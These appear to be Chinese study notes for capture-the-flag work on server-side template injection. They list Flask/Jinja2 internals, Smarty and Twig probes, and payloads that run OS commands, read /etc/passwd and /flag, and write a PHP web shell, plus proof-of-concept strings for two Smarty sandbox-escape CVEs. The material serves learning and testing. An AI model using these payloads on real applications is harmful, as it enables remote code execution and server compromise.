# 引擎判断
![](attachments/Pasted%20image%2020240222134656.png)
## Python
## 内部魔术方法
| 方法                   | 描述                                                                                                                                                                                                            |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `__class__`            | 返回对象所属的类                                                                                                                                                                                                |
| `__init__`             | 类的初始化方法                                                                                                                                                                                                  |
| `__bases__`/`__mro__`  | 返回盖类型的所有父类                                                                                                                                                                                            |
| `__subclasses__`       | 返回继承该类的所有可用子类                                                                                                                                                                                      |
| `__globals__`          | 返回当前位置所有可用的全部全局变量的字典引用                                                                                                                                                                    |
| `__dict__`             | 包含类的静态函数、类函数、普通函数、全局变量以及一些内置属性的字典                                                                                                                                              |
| `__getattribute__()`   | 存在于实例、类和函数中的_`_getattribute__`魔术方法。实际上，当针对实例化的对象进行点操作（例如：a.xxx / a.xxx()）时，都会自动调用`__getattribute__`方法。因此，我们可以通过这个方法直接访问实例、类和函数的属性 |
| `__getitem__()`        | 调用字典中的键值，实际上是调用此魔术方法。例如，`a['b']` 就是 `a.__getitem__('b')`                                                                                                                              |
| `__builtins__`         | 内建名称空间，包含一些常用的内建函数                                                                                                                                                                            |
| `__import__`           | 动态加载类和函数，也可用于导入模块。常用于导入os模块，例如`__import__('os').popen('ls').read()`                                                                                                                 |
| `__str__()`            | 返回描述该对象的字符串，通常用于打印输出                                                                                                                                                                        |
| `url_for`              | Flask框架中的一个方法，可用于获取`__builtins__`，且u`rl_for.__globals__['__builtins__']`包含current_app                                                                                                         |
| `get_flashed_messages` | Flask框架中的一个方法，可用于获取`__builtins__`，且`get_flashed_messages.__globals__['__builtins__']`包含current_app                                                                                            |
| `lipsum`               | Flask框架中的一个方法，可用于获取`__builtins__`，且`lipsum.__globals__`包含os模块（例如：`{{lipsum.__globals__['os'].popen('ls').read()}}`）                                                                    |
| `current_app`          | 应用上下文的全局变量                                                                                                                                                                                            |
| `request`              | 用于获取绕过字符串的参数                                                                                                                                                                                        |
| `config`               | 当前应用的所有配置。还可以使用`{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`来执行操作系统命令                                                                                          |
| `g`                       | 通过`{{ g }}`可以获取`<flask.g of 'flask_ssti'>`                                                                                                                                                                                                                |
### Jinja2


## PHP
### Smarty
- **{$smarty.version}**  返回版本信息
- **${smarty.template}**  返回当前模板的文件名

#### {literal} 标签
{literal} 可以让一个模板区域的字符原样输出
在 PHP5 环境下存在一种 PHP 标签， `<scriptlanguage="php"></script>`，我们可以利用这一标签进行任意的 PHP 代码执行

#### {if} 标签
Smarty 的 {if} 条件判断和 PHP 的 if 非常相似，只是增加了一些特性。每个 {if} 必须有一个配对的 {/if}，也可以使用 {else} 和 {elseif} ，全部的PHP条件表达式和函数都可以在 {if} 标签中使用

```php
{if phpinfo()}{/if}
{if readfile ('/flag')}{/if}
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if}
```

#### {php} 标签
Smarty3 官方手册中明确表示已经废弃 {php} 标签，不建议使用。在 Smarty3.1， {php} 仅在 SmartyBC 中可用

#### 获取类的静态方法
`{self::getStreamVariable("file:///etc/passwd")}`
不过这种利用方式只存在于旧版本中，而且在 3.1.30 的 Smarty 版本中官方已经将 getStreamVariable 静态方法删除。

```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
// 在高版本下同样不能使用
```

#### CVE-2021-26120
SmartyInternalRuntime_TplFunction 沙箱逃逸漏洞
poc
```text
string:{function+name='rce(){};system("id");function+'}{/function}
```

只要将前后闭合，将我们要执行的代码插入到闭合两端的中间就可以借助缓存文件执行

![](attachments/Pasted%20image%2020240222135714.png)

#### CVE-2021-26119
Smarty template_object 沙箱逃逸 PHP 代码注入漏洞
poc 
```text
string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+phpinfo();",$s)}
```

### Twig
- `{{_self}}`  指向当前应用
- `{{_self.env}}` 
- `{{dump(app)}}`
- `{{app.request.server.all|join(',')}}`

# 参考文章
[一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/2130787)
[【网络安全 | 1.5w字总结】SSTI漏洞入门，这一篇就够了。-CSDN博客](https://blog.csdn.net/2301_77485708/article/details/132467976)
[以Twig模板为例浅学一手SSTI - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/314028.html)
[Smarty 模板注入与沙箱逃逸 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/501811049)